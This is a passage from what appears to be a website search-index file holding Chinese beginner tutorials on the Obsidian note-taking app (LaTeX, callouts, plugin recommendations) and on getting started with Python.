<p>Attention</p> <p>\u4e0d\u540c\u573a\u5408\u89e6\u53d1\u6761\u4ef6\u6709\u6240\u4e0d\u540c\uff0c\u4f8b\u5982\u5728 obsidian \u4e2d\u6211\u4eec\u53ef\u80fd\u9700\u8981\u7528 <code>$$\u2026\u2026$$</code> \u5c06\u516c\u5f0f\u5305\u88f9\u800c\u53ef\u4ee5\u5ffd\u7565 <code>\\begin</code> \u4e4b\u7c7b\u7684</p> <p>Caution: LATEX mostly ignores your spaces in mathematics, but it can\u2019t handle blank lines in equations \u2014 don\u2019t put blank lines in your mathematics.</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii134-latex-suite","title":"III.13.4 \u63d2\u4ef6-latex suite","text":"<p>\u6bcf\u6b21\u90fd\u624b\u6253\u547d\u4ee4\u81ea\u7136\u4e5f\u662f\u633a\u7d2f\u7684\uff0cobsidian \u4e2d\u6709\u8fd9\u4e48\u4e00\u4e2a\u63d2\u4ef6\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5feb\u901f\u8f93\u51fa</p> <p>\u4f8b\u5982\uff1a\u4e00\u4e2a\u6bd4\u8f83\u590d\u6742\u7684\u4e00\u9636\u7ebf\u6027\u975e\u9f50\u6b21\u65b9\u7a0b\u7684\u901a\u89e3\u6211\u4eec\u53ef\u4ee5\u6bd4\u8f83\u5feb\u7684\u5199\u51fa\u6765</p> \\[ y=e^{ -\\int p(x) \\, dx  }\\left[ \\int q(x)e^{ \\int p(x) \\, dx  } \\, dx  \\right] \\] <p><code>LaTeX suite</code> \u5177\u4f53\u4f7f\u7528\u6559\u7a0b\u751a\u591a\uff0c\u4e0d\u52a0\u8d58\u8ff0\uff08\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u8fd9\u4e2a\u63d2\u4ef6\u672c\u8d28\u662f\u4e00\u4e2a\u5173\u952e\u8bcd\u66ff\u6362\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u66f4\u6362\u7684\u5bf9\u8c61\uff0c\u751a\u81f3\u53ef\u4ee5\u5728\u6570\u5b66\u516c\u5f0f\u4e4b\u5916\u4f7f\u7528\uff0c\u8be6\u89c1\u6587\u672b\uff09\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii135","title":"III.13.5 \u7a7a\u683c","text":"<p>\u76f4\u63a5\u6572\u7a7a\u683c\u4f1a\u88ab\u81ea\u52a8\u5ffd\u7565</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii14-callouts","title":"III.14 \u6807\u6ce8 (Callouts)","text":"","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii141_1","title":"III.14.1 \u57fa\u672c\u4f7f\u7528","text":"<p>\u4f7f\u7528\u6807\u6ce8\u53ef\u4ee5\u5728\u4e0d\u6253\u4e71\u7b14\u8bb0\u884c\u6587\u7684\u60c5\u51b5\u4e0b\u6dfb\u52a0\u989d\u5916\u5185\u5bb9\uff0c\u5c06 <code>[!title]</code> \u52a0\u5165\u5230\u5f15\u7528\u5f00\u5934\u3002</p> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u7528\u6cd5\u5982\u4e0b\uff1a</p> example<pre><code>&gt; [!TIP] \u5c0f\u6280\u5de7\n&gt;\n&gt; \u8fd9\u91cc\u5c06\u4ecb\u7ecd\u4e00\u4e9b\u5c0f\u6280\u5de7\u3002\n</code></pre> <p>\u4f46\u662f\u5728 Mkdocs \u4e2d\u53ea\u6709\u8fd9\u6837\u7684\u6548\u679c\uff1a</p> <p>\u5c0f\u6280\u5de7</p> <p>\u8fd9\u91cc\u5c06\u4ecb\u7ecd\u4e00\u4e9b\u5c0f\u6280\u5de7\u3002</p> <p>\u6240\u4ee5\u2026\u2026\u5f53\u4f60\u5728\u770b\u6211\u5176\u5b83\u7684\u7b14\u8bb0\u65f6\uff0c\u5c31\u5f53\u7528\u8fd9\u4e2a\u6765\u5224\u65ad\u6ce8\u91ca\u5757\u7684\u5185\u5bb9\u5427\u3002</p> <p>\u9664\u4e86 <code>TIP</code> \uff0ccallout \u8fd8\u652f\u6301\u8bb8\u591a\u56fe\u6807\uff1b</p> Type Aliases note note, seealso abstract abstract, summary, tldr info info, todo tip tip, hint, important success success, check, done question question, help, faq warning warning, caution, attention failure failure, fail, missing danger danger, error bug bug example example quote quote, cite <p>\u4f60\u53ef\u4ee5\u5728 \u8fd9\u91cc \u770b\u5230\u5404\u81ea\u7684\u6548\u679c\uff1b</p> <p>\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\uff1a</p> Info <p>\u8fd9\u91cc\u662f\u4e00\u4e9b\u4fe1\u606f\u3002</p> <p>\u6ce8\u610f\u770b <code>[!INFO]-</code> \u4e2d\u591a\u4e86\u4e00\u4e2a <code>-</code> \uff0c\u8868\u793a\u6298\u53e0\uff1b\u5982\u679c\u5e0c\u671b\u521d\u59cb\u4e3a\u5c55\u5f00\u72b6\u6001\uff0c\u4f7f\u7528 <code>+</code> \u5373\u53ef\u3002</p> <p>\u5f53\u7136\uff0c\u652f\u6301\u5d4c\u5957\uff1a</p> <p>\u6807\u6ce8\u53ef\u4ee5\u5d4c\u5957\u5417\uff1f</p> <p>\u53ef\u4ee5\u3002</p> <p> \u4f60\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528\u591a\u5c42\u5d4c\u5957\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii142","title":"III.14.2 \u81ea\u5b9a\u4e49","text":"custom<pre><code>.callout[data-callout=\"custom-name\"] {/* \u81ea\u5b9a\u4e49\uff0c\u4f60\u53ef\u4ee5\u81ea\u9009\u4e00\u4e2a\u82f1\u6587\u6216\u4e2d\u6587\u8bcd\uff0c\u82f1\u6587\u8981\u5168\u90e8\u5c0f\u5199*/\n    --callout-color: 0, 0, 0; /* RGB \u8272\u53f7\uff0c\u4e00\u4e2a\u53ef\u627e\u7684\u5730\u65b9 https://www.zhongguose.com/ */\n    --callout-icon: lucide-icons ID|SVG;/* \u5efa\u8bae\u4f7f\u7528ID\uff0c\u7b80\u6d01\u4e14\u4e00\u76ee\u4e86\u7136 */\n}\n</code></pre> <p>\u5176\u4e2d ID \u5462\u5c31\u662f\u56fe\u6807\u540d\u79f0\uff0cSVG \u5c31\u4e0d\u5fc5\u8bf4\u4e86\uff0c\u4ed6\u4eec\u90fd\u53ef\u4ee5\u5728 Lucide \u4e0a\u627e\u5230\uff1a</p> <p></p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u6d4b\u8bd5\u6837\u4f8b\uff1a</p> democase<pre><code>.callout[data-callout=\"democase\"] {\n    --callout-color: 0, 123, 255; /* \u84dd\u8272 */\n    --callout-icon: tv; /* \u5efa\u8bae\u4f7f\u7528\uff0c\u7b80\u6d01\u4e14\u4e00\u76ee\u4e86\u7136 */\n    /* --callout-icon: &lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-tv\"&gt;&lt;rect width=\"20\" height=\"15\" x=\"2\" y=\"7\" rx=\"2\" ry=\"2\"/&gt;&lt;polyline points=\"17 2 12 7 7 2\"/&gt;&lt;/svg&gt;; */\n}\n</code></pre> <p>\u8fd9\u91cc\u662f\u4e00\u4e2a\u6f14\u793a\u7528\u4f8b\u3002</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u622a\u6b62 2024/08/11\uff0c\u76ee\u524d\u5b9e\u9645\u4f7f\u7528\u7684 Lucide \u7248\u672c\u4e3a v0.268.0\uff1b\u5728\u6b64\u4e4b\u540e\u521b\u5efa\u6216\u8005\u4fee\u6539\u7684\u56fe\u6807\u90fd\u53ef\u80fd\u51fa\u73b0\u95ee\u9898\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iii143-admonitions","title":"III.14.3 Admonitions \uff08\u63d2\u4ef6\uff09","text":"<p>\u8fd9\u4e2a\u63d2\u4ef6\u636e\u8bf4\u662f\u5728\u5b98\u65b9\u7684\u6807\u6ce8\u65b9\u5f0f\u51fa\u6765\u524d\u5236\u4f5c\u7684\uff0c\u800c\u4e14\u8fbe\u5230\u4e0a\u8ff0\u6548\u679c\u66f4\u52a0\u7b80\u5355\uff1a</p> <p></p> <p>\u4f46\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u95ee\u9898\u2026\u2026Mkdocs \u4e0a\u770b\u8d77\u6765\u66f4\u52a0\u5947\u602a\u4e86\uff1a</p> <pre><code>title: \u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\n\n````ad-note\ntitle: \u8fd9\u662f\u4e00\u4e2a\u7b14\u8bb0 \n\n\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u6b22\u8fce\u51fd\u6570\n\n~~~py\ndef welcome(name: string):\n    print(f\"welcome to here, {name}.\")\n~~~\n\n```c\nvoid welcome(string name){\n    cout &lt;&lt; \"welcome to here, \" &lt;&lt; name &lt;&lt; \" .\"&lt;&lt; endl;\n}\n````\n\n!!! help\n\n    icon: bars\n    title: \u8fd9\u662f\u4e00\u4e2a\u8bbe\u7f6e\u5185\u5bb9\n\n    \u2191\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u56fe\u6807\u53ef\u4ee5\u81ea\u5b9a\u4e49\n\n    - aaa\n    - bbb\n    - ccc\n\n!!! info \"$e^{i \\pi}+1=0$\"\n\n    icon: brain\n\n    \u4f60\u53ef\u4ee5\u5728\u540d\u79f0\u4e2d\u4f7f\u7528 latex \u6570\u5b66\u516c\u5f0f\u3002\n</code></pre> <p>\u4f46\u662f\uff0c\u8fd8\u6709\u53cd\u8f6c\uff1a</p> <p></p> <p>Admonition \u5141\u8bb8\u6211\u4eec\u81ea\u5b9a\u4e49\uff0c\u800c\u5176\u53c8\u652f\u6301\u5b98\u65b9\u7684 Callout \u683c\u5f0f\uff1b\u6240\u4ee5\u6211\u4eec\u5728\u8fd9\u91cc\u8fdb\u884c\u81ea\u5b9a\u4e49\u66f4\u65b9\u4fbf\uff0c\u4e5f\u66f4\u4e0d\u5bb9\u6613\u51fa\u95ee\u9898\u3002</p> <p>\u5230\u6b64\uff0c\u6211\u4eec\u5df2\u7ecf\u638c\u63e1\u4e86\u8fd9\u4e2a\u8f6f\u4ef6\u7684\u7edd\u5927\u591a\u6570\u529f\u80fd\u4e86\uff0c\u5e76\u53d1\u73b0\u53ef\u4ee5\u505a\u4e00\u4e9b\u65e5\u5e38\u4e8b\u52a1\u4e86\u3002\u73b0\u5728\uff0c\u5f00\u52a8\u5427\uff01</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv","title":"IV \u63d2\u4ef6\u63a8\u8350\uff1a","text":"","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv1-admonition","title":"IV.1 Admonition","text":"<p>\u5728\u5b98\u65b9\u652f\u6301 callouts \u4e4b\u524d\u7684\u670d\u52a1\uff0c\u73b0\u5728\u4e5f\u53ef\u4ee5\u7528\u4e8e\u52a0\u5f3a\u89c2\u611f\u7b49\uff0c\u5982\u652f\u6301\u5c55\u5f00\u6536\u7eb3\uff1b \u652f\u6301\u81ea\u5b9a\u4e49\uff0c\u5982\uff1a</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv2-calendar","title":"IV.2 Calendar","text":"<p>\u652f\u6301\u65e5\u5386\uff08\u5012\u662f\u7528\u5904\u4e0d\u5927\uff09\uff1b\u652f\u6301\u65e5\u8bb0\uff1a\u5199\u65e5\u8bb0\u786e\u5b9e\u575a\u6301\u4e0d\u4e0b\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u6bcf\u5929\u7528\u65e0\u5e8f\u5217\u8868\u8bb0\u5f55\u4e00\u4e0b\u5e72\u4e86\u4ec0\u4e48\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u6a21\u677f\u53c2\u8003\uff08\u5176\u4e2d\u7684\u7279\u6b8a\u683c\u5f0f\u53ef\u4ee5\u770b\u540e\u6587\u7684\u201c\u6807\u6ce8 (Callouts)\u201d\u90e8\u5206\u5662\uff09\uff1a</p> diary template<pre><code>---\ntime: {{time:HH:mm}} \n---\n\n---\n\n- [*] \u8fd9\u662f\u4e00\u4e2a\u8f83\u6709\u610f\u4e49\u7684\u9879\u76ee \n- [x] \u8fd9\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b8c\u6210\u7684\u9879\u76ee\n- [/] \u8fd9\u662f\u4e00\u4e2a\u6709\u5f85\u7ee7\u7eed\u7684\u9879\u76ee\n- [?] \u8fd9\u662f\u4e00\u4e2a\u5b58\u5728\u95ee\u9898\u7684\u9879\u76ee\n- [!]  \u8fd9\u662f\u4e00\u4e2a\u5341\u5206\u91cd\u8981\u7684\u9879\u76ee\n- [\"] \u8fd9\u662f\u4e00\u4e2a\u6709\u6240\u53d7\u76ca\u7684\u9879\u76ee\n- [-] \u8fd9\u662f\u4e00\u4e2a\u65e0\u5173\u7d27\u8981\u7684\u9879\u76ee\n- [&lt;] \u8fd9\u662f\u4e00\u4e2a\u516c\u4e8b\u516c\u529e\u7684\u9879\u76ee\n- [&gt;] \u8fd9\u662f\u4e00\u4e2a\u4f11\u95f2\u5a31\u4e50\u7684\u9879\u76ee\n- [ ] \u8fd9\u662f\u4e00\u4e2a\u5c1a\u672a\u5f00\u59cb\u7684\u9879\u76ee\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv3-easy-typing","title":"IV.3 Easy Typing","text":"<p>\u5185\u5bb9\u8fd8\u633a\u591a\u7684\uff0c\u603b\u7ed3\u6765\u8bf4\u5c31\u662f\u589e\u5f3a\u7f16\u8f91\u4f53\u9a8c\uff0c\u5177\u4f53\u53ef\u770b easy-typing-obsidian \u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv4-latex-suite","title":"IV.4 Latex Suite","text":"<p>\u672c\u610f\u662f\u8ba9\u6211\u4eec\u5199 latex \u683c\u5f0f\u7684\u5185\u5bb9\u66f4\u52a0\u65b9\u4fbf\uff1b\u4f46\u662f\u56e0\u4e3a\u5176\u5b9e\u73b0\u672c\u8d28\u662f\u5173\u952e\u8bcd\u66ff\u6362\uff08\u5982\u5c06 pi=&gt;\\pi\uff09\uff0c\u6240\u4ee5\u4eff\u7167\u5176\u81ea\u5e26\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u6709\u66f4\u591a\u5730\u81ea\u5b9a\u4e49\u7684\u53ef\u80fd\uff1a</p> Latex_suite.js<pre><code>// Callouts\n{trigger: \"&gt;note\", replacement: \"&gt; [!NOTE]\\n&gt;\\n&gt; $0\", options: \"tA\"},\n{trigger: \"&gt;abs\", replacement: \"&gt; [!ABSTRACT]\\n&gt;\\n&gt; $0\", options: \"tA\"},\n{trigger: \"&gt;sum\", replacement: \"&gt; [!SUMMARY]\\n&gt;\\n&gt; $0\", options: \"tA\"},\n{trigger: \"&gt;tldr\", replacement: \"&gt; [!TLDR]\\n&gt;\\n&gt; $0\", options: \"tA\"},\n{trigger: \"&gt;info\", replacement: \"&gt; [!INFO]\\n&gt;\\n&gt; $0\", options: \"tA\"},\n</code></pre> <p>\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u952e\u5165 <code>&gt;note</code> \u65f6\uff0c\u4f1a\u81ea\u52a8\u5c06\u5176\u66ff\u6362\u4e3a\u540e\u9762\u7684\u5185\u5bb9\uff0c\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e2a\u4eba\u4f7f\u7528\u7684 Latex_Suite.js\uff08\u70b9\u51fb\u4e0b\u8f7d\uff0c\u5982\u679c\u5931\u8d25\u4e86\u53ef\u4ee5\u770b GitHub \u4ed3\u5e93 \uff0c\u5728 docs/posts/begin/attachments \u4e2d\uff09\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv5-minimal-theme-settings","title":"IV.5 Minimal theme settings","text":"<p>\u5982\u679c\u4f60\u4f7f\u7528\u7684\u4e3b\u9898\u662f Minimal \uff0c\u8fd9\u4e2a\u63d2\u4ef6\u80fd\u591f\u8ba9\u4f60\u66f4\u52a0\u5b9a\u5236\u5316\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv6-mousewheel-image-zoom","title":"IV.6 Mousewheel Image zoom","text":"<p>\u4f7f\u7528\u9f20\u6807\u6eda\u8f6e\u653e\u7f29\u56fe\u7247\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv7-number-headings","title":"IV.7 Number Headings","text":"<p>\u6807\u9898\u81ea\u52a8\u52a0\u5e8f\u53f7\uff0c\u6bd4\u8f83\u5efa\u8bae\u5199\u5b8c\u4e86\u518d\u52a0\uff0c\u800c\u4e0d\u662f\u8ba9\u5b83\u81ea\u52a8\u52a0\uff1b\u81ea\u52a8\u52a0\u6709\u70b9\u4e0d\u592a\u806a\u660e\u7684\u6837\u5b50\u2026\u2026</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv8-paste-image-rename","title":"IV.8 Paste image rename","text":"<p>\u7c98\u8d34\u56fe\u7247\u81ea\u52a8\u91cd\u547d\u540d\uff1b\u6ce8\u610f\uff0c\u5982\u679c\u662f\u62d6\u8fdb\u6765\u7684\u56fe\u7247\u4e0d\u4f1a\uff0c\u5e94\u5f53\u662f\u4f60\u4ece\u526a\u8d34\u677f\u4e2d\u7c98\u8d34\u4e0b\u6765\u7684\u56fe\u7247\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv9-paste-url-into-selection","title":"IV.9 Paste URL into selection","text":"<p>\u9009\u53d6\u4e00\u6bb5\u6587\u5b57\uff0c\u7c98\u8d34\u7684\u5982\u679c\u662f\u4e00\u6bb5\u94fe\u63a5\u5c31\u53d8\u4e3a\u8d85\u94fe\u63a5\u7684\u683c\u5f0f\uff0c\u6bd4\u8f83\u65b9\u4fbf\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv10-pdf","title":"IV.10 PDF++","text":"<p>\u6309\u7167\u5b83\u7684\u6587\u6863\u53bb\u770b\u5427\uff0c\u6bd4\u8f83\u9002\u5408\u770b pdf \u65f6\u505a\u7b14\u8bb0\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv11-style-settings","title":"IV.11 Style Settings","text":"<p>\u4fbf\u6377\u8bbe\u7f6e\u6837\u5f0f\uff0c\u7528\u8fc7\u5c31\u77e5\u9053\u4e86\uff0c\u76f4\u63a5\u8bb2\u4e5f\u96be\u8bf4\u6e05\u695a\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Obsidian_begin/#iv12-typewriter-mode","title":"IV.12 Typewriter Mode","text":"<p>\u8ba9\u4f60\u7684\u7f16\u8f91\u7684\u90a3\u4e00\u884c\u59cb\u7ec8\u5728\u5c4f\u5e55\u7684\u56fa\u5b9a\u4f4d\u7f6e\uff0c\u4e0d\u7528\u8ddf\u7740\u62ac\u5934\u4f4e\u5934\u4e86\u3002</p> <p>\u8fd9\u4e2a\u63d2\u4ef6\u5728\u7f16\u8f91\u8868\u683c\u65f6\u6709\u4e00\u4e9b\u6545\u969c\uff0c\u4f53\u73b0\u5728\u4f1a\u81ea\u52a8\u8d34\u5230\u9876\u7aef\u53bb\u3002</p> <ol> <li> <p>\u811a\u6ce8\u5f88\u6709\u7528\uff01\u00a0\u21a9</p> </li> <li> <p>\u8fd9\u662f\u4e00\u4e2a\u53ef\u4ee5\u5199\u957f\u6bb5\u843d\u6216\u8005\u4ee3\u7801\u7684\u5730\u65b9\u3002     \u4f60\u53ef\u4ee5\u4f7f\u7528\u7f29\u8fdb\u5728\u811a\u6ce8\u4e2d\u7eb3\u5165\u5176\u4ed6\u6bb5\u843d     <code>{ \u4ee3\u7801 }</code> \u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u5728\u811a\u6ce8\u4e2d\u6dfb\u52a0\u4efb\u610f\u6570\u91cf\u7684\u6bb5\u843d\u4e86\u3002\u00a0\u21a9</p> </li> </ol>","tags":["begin"]},{"location":"tutorial/begin/Python_begin/","title":"Python begin","text":"<p>\u4e00\u4e2a\u6c34\u5e73\u6bd4\u8f83\u4f4e\u7684 python \u5165\u95e8\u6307\u5317\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Python_begin/#_1","title":"\u53c2\u8003\u81ea\u5b66\u8d44\u6599","text":"<p>python \u8d44\u6599\u771f\u662f\u592a\u591a\u4e86\uff0c\u4e0b\u9762\u662f\u6211\u7528\u8fc7\u7684\u3002</p> <ul> <li>\u5982\u679c\u6709\u7f16\u7a0b\u57fa\u7840\uff0c\u6216\u8005\u5b66\u4e86\u4e00\u4e9b\u4e9b\u5173\u4e8e python \u7684\u5185\u5bb9\u4e86\uff0c\u53ef\u4ee5\u8bd5\u8bd5 codechef \u4e0a\u7684\u6559\u7a0b\uff0c\u597d\u5904\u5728\u4e8e\u6b65\u9aa4\u5341\u5206\u7ec6\u81f4\uff0c\u914d\u5957\u4e86\u57fa\u7840\u7ec3\u4e60\u9898\u548c\u5728\u7ebf\u6253\u5206\u5e73\u53f0\uff1b\u867d\u7136\u53ea\u6709\u5f00\u59cb\u4e00\u5c0f\u90e8\u5206\u662f\u514d\u8d39\u7684\uff0c\u4f46\u662f\u8db3\u591f\u8ba9\u4f60\u7406\u89e3\u5230\u5927\u591a\u6570\u7684\u4ee3\u7801\u63d0\u4ea4\u5e73\u53f0\u5982\u4f55\u4f7f\u7528\u3002</li> <li>\u5bf9\u4e8e\u9002\u5e94\u4ed6\u4eba\u8bb2\u89e3\u7684\u540c\u5b66\uff0c\u9002\u5408\u89c6\u9891\u6559\u5b66\uff0cB \u7ad9\u4e0a\u9ed1\u9a6c\u7a0b\u5e8f\u5458\u7684\u8fd8\u53ef\u4ee5\uff1b\u5982\u679c\u538c\u70e6\u4e8e\u201c\u5f00\u573a\u767d\u201d\uff0c\u53ef\u4ee5 B \u7ad9\u627e\u5176\u4ed6\u7684\uff0c\u90fd\u5927\u5dee\u4e0d\u5dee\u5427\uff0c\u6bd5\u7adf python \u5176\u5b9e\u975e\u5e38\u666e\u53ca\u4e86\u3002</li> <li>\u5bf9\u4e8e\u81ea\u5b66\u80fd\u529b\u5f3a\uff0c\u6709\u8010\u5fc3\u7684\u540c\u5b66\uff0c\u6587\u672c\u6587\u6863\u4e2d\u83dc\u9e1f\u6559\u7a0b \u4e5f\u4e0d\u9519\uff1b\u4f46\u662f IDE \u63a8\u8350\u8fd8\u662f\u4f7f\u7528 vscode\uff08\u56e0\u4e3a\u4ee5\u540e\u5f80\u5f80\u4e0d\u53ea\u662f\u5199 python\uff0c\u5176\u4ed6\u901a\u7528 IDE \u4e5f\u662f\u4e0d\u9519\u7684\u9009\u62e9\uff09\uff0c\u5b89\u88c5\u4f7f\u7528\u81ea\u884c\u641c\u7d22\u3002</li> <li>\u5f53\u7136\u8fd8\u6709\u5b98\u65b9\u6559\u7a0b\u4e2d\u6587\u7248 \uff0c\u5b98\u65b9\u539f\u6559\u7a0b\u5168\u82f1\u6587\u7684\uff0c\u4f30\u8ba1\u6ca1\u591a\u5c11\u4eba\u5f00\u59cb\u5c31\u6709\u8010\u5fc3\u770b\u3002</li> <li>\u5728\u4e4b\u540e\uff0c\u9047\u89c1\u4e0d\u4f1a\u7684\u5e94\u8be5\u66f4\u591a\u67e5\u8be2\u5b98\u65b9\u6587\u6863\u4e86\u3002</li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Python_begin/#_2","title":"\u5f00\u59cb\u5e72\u9898\uff1f","text":"<p>\u5b66\u4e86\u4e00\u4e9b\u4e4b\u540e\uff0c\u4e2a\u4eba\u89c9\u5f97\u5f00\u59cb\u4f7f\u7528\u624d\u662f\u5de9\u56fa\u548c\u5b66\u4f1a\u4f7f\u7528\u7684\u6700\u597d\u529e\u6cd5\uff1b\u800c\u6700\u7b80\u5355\u7684\u8003\u5bdf\u4ee3\u7801\u6c34\u5e73\u7684\u65b9\u5f0f\u4e4b\u4e00\u5c31\u662f\u5237\u9898\u3002\u4e0b\u9762\u7684\u9898\u4e2a\u4eba\u8ba4\u4e3a\u7531\u7b80\u5355\u5230\u96be\uff1a</p> <ul> <li>codechef<ul> <li>\u8fb9\u6559\u8fb9\u5b66\uff0c\u9002\u5408\u6ca1\u5199\u8fc7\u9898\u7684\u5165\u95e8\uff08\u90e8\u5206\u514d\u8d39\uff0c\u6240\u4ee5\u4ec5\u7528\u4e8e\u4ece\u6ca1\u6709\u5199\u8fc7\u9898\u7684\u4eba\u5165\u95e8\uff09</li> </ul> </li> <li>\u6d1b\u8c37\u5165\u95e8\u9898\u5355<ul> <li>\u53ef\u4ee5\u81ea\u5df1\u5207\u6362\u8bed\u8a00\uff0c\u9002\u5408\u6ca1\u5199\u8fc7\u9898\u7684\u5165\u95e8</li> <li>\u4f46\u662f\u4e2a\u4eba\u611f\u89c9\u6d4b\u8bd5\u8bc4\u5224\u4e0d\u592a\u53cb\u597d\uff0c\u6240\u4ee5\u5f88\u65e9\u8f6c\u4e86 LeetCode</li> </ul> </li> <li>LeetCode \u7b97\u6cd5\u901a\u5173\u6307\u5357<ul> <li>\u57fa\u4e8e python \u7684\u6570\u636e\u7ed3\u6784\u5165\u95e8\uff0c\u914d\u5957 LeetCode \u4e0a\u7684\u5165\u95e8\u9898</li> <li>\u61c2\u4e86\u6570\u636e\u7ed3\u6784\uff0c\u624d\u4f1a\u66f4\u52a0\u660e\u767d\u7b97\u6cd5\u662f\u4ec0\u4e48</li> </ul> </li> <li>LeetCode \u7565\u8fdb\u9636\u6307\u5357</li> <li>\u518d\u540e\u9762\uff0c\u611f\u89c9\u8be5\u505a\u4ec0\u4e48\u5e94\u8be5\u6709\u81ea\u5df1\u7684\u7406\u89e3\u4e86\u5427</li> </ul> <p>PS\uff1aLeetCode \u4e0a\u7684\u9898\u76ee\u57fa\u4e8e\u5bf9 Class \u5e94\u5f53\u6709\u6240\u7406\u89e3\uff1b\u4e0d\u9700\u8981\u592a\u591a\uff0c\u53ea\u8981\u660e\u767d\uff0c\u6211\u4eec\u5e94\u8be5\u7ed9\u51fa\u4e00\u4e2a\u7528\u4e8e\u89e3\u51b3\u95ee\u9898\u7684 Class \u5373\u53ef\uff1b\u518d\u4e0d\u6d4e\uff0c\u770b\u51e0\u4e2a\u9898\u89e3\u4e5f\u4f1a\u660e\u767d\u7684\u5427\u3002</p> <p>LeetCode Night \u6df1\u8272\u6a21\u5f0f</p> <p>\u5bf9\u4e8e\u4e0b\u9762\u63cf\u8ff0\u7684\u6240\u6709\u4e1c\u897f\uff0c\u5982\u679c\u6709\u4e0d\u660e\u767d\u7684\uff0c\u6211\u76f8\u4fe1\u641c\u7d22\u5f15\u64ce\u6216\u8005\u662f GLM \u7b49\u4e00\u5b9a\u80fd\u591f\u56de\u7b54\u4f60\u3002\u5bf9\u4e8e\u4e0b\u5212\u7ebf\u4e2d\u7684\u5185\u5bb9\uff0c\u5f88\u53ef\u80fd\u5c31\u662f\u9700\u8981\u4f60\u53bb\u67e5\u8be2\u3002\u5176\u4e2d\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\uff0c\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u4e25\u8c28\u4e4b\u5904\uff0c\u656c\u8bf7\u6307\u51fa\u3002</p> <p>\u5efa\u8bae\u4f7f\u7528 PC \u7aef\u9605\u8bfb\uff0c\u56e0\u4e3a\u5176\u4e2d\u6709\u4e0d\u5c11\u8d85\u94fe\u63a5\u53ef\u80fd\u9700\u8981\u6211\u4eec\u67e5\u770b\u3002</p> <p>\u5bf9\u4e8e\u6807\u6ce8 Extra \u7684\u5185\u5bb9\uff0c\u4e0d\u91cd\u8981\uff0c\u53ea\u662f\u66f4\u52a0\u6df1\u5165\u5730\u4ecb\u7ecd\u3002</p>","tags":["begin"]},{"location":"tutorial/begin/Python_begin/#_3","title":"\u7f16\u7a0b\u521d\u7406\u89e3","text":"<p>\u4ec0\u4e48\u662f python\uff1f</p> <p>[!DEFINITION ] \u7ef4\u57fa\u767e\u79d1</p> <p>Python is\u00a0dynamically typed\u00a0and\u00a0garbage-collected. It supports multiple\u00a0programming paradigms, including\u00a0structured\u00a0(particularly\u00a0procedural),\u00a0object-oriented\u00a0and\u00a0functional programming. It is often described as a \"batteries included\" language due to its comprehensive\u00a0standard library.</p> <p>\u770b\u4e0d\u61c2\uff1f\u6211\u4e5f\u4e0d\u5b8c\u5168\u80fd\u591f\u7406\u89e3\u91cc\u9762\u7684\u6240\u6709\u8bcd\uff08\u6682\u4e14\u53ea\u9700\u8981\u77e5\u9053\uff0c\u5b83\u662f\u4e00\u79cd \u7f16\u7a0b\u8bed\u8a00 \u5373\u53ef\uff09\uff0c\u6240\u4ee5\u6211\u4eec\u6682\u4e14\u629b\u5f00\u8fd9\u4e9b\uff0c\u76f4\u63a5\u770b\u4e0b\u9762\u4e00\u4e9b\u4f8b\u5b50\u3002</p> <p></p> <p>\u9996\u5148\uff0c\u6211\u4eec\u770b\u5de6\u4fa7\uff0c\u5728 IDE \uff08\u6b64\u5904\u4f7f\u7528 vscode \uff09\u4e2d\u5199\u4ee3\u7801\u3002\u5728\u56fe\u4e2d\uff0c\u6211\u4eec\u5199\u4e86\u6700\u4e3a\u7b80\u5355\u7684 python \u8bed\u53e5\u4e4b\u4e00\uff1a</p> <pre><code>print(1)\n</code></pre> 